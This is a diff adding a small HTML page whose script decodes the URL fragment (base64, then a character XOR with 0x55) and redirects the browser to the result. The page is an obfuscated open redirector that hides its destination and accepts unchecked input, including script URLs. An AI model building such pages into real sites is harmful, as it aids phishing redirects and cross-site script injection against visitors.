@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>+</title>
+</head>
+<body>
+<script>
+let h=location.hash.substring(1);
+let _=function(s){let r="";for(let i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^0x55);return r;};
+if(h){location.href=_(atob(h));}
+</script>
+</body>
+</html>
